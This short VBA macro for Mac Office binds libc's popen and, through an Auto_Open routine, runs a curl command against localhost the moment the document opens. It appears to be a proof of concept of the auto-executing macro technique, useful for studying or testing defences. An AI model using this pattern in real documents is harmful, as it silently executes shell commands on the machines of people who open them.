Private Declare PtrSafe Function web_popen Lib "libc.dylib" Alias "popen" (ByVal Command As String, ByVal Mode As String) As LongPtr

Sub Auto_Open()
    Result = web_popen("curl 127.0.0.1/?123123123", "r")
End Sub



